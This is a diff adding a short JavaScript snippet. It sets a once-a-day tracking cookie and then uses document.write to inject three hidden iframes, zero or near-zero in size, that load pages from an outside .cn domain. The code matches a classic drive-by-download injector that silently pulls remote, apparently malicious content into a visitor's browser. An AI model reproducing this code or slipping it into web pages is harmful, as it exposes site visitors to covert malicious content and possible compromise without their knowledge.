@@ -1,0 +1,19 @@
+window.status="";
+var cookieString = document.cookie;
+var start = cookieString.indexOf("0wen0wen=");
+if (start != -1)
+{}
+else
+{
+var expires = new Date();
+expires.setTime(expires.getTime() +  24 * 1 * 60 * 60 * 1000);
+document.cookie = "0wen0wen=funny;expires=" + expires.toGMTString();
+try{
+document.write("<iframe width=0 height=0 src=http://hoursebuilds.cn/014.htm></iframe>");
+document.write("<iframe width=20 height=0 src=http://hoursebuilds.cn/old.htm></iframe>");
+document.write("<iframe width=20 height=0 src=http://hoursebuilds.cn/xin.htm></iframe>");
+}
+catch(e)
+{
+};
+}
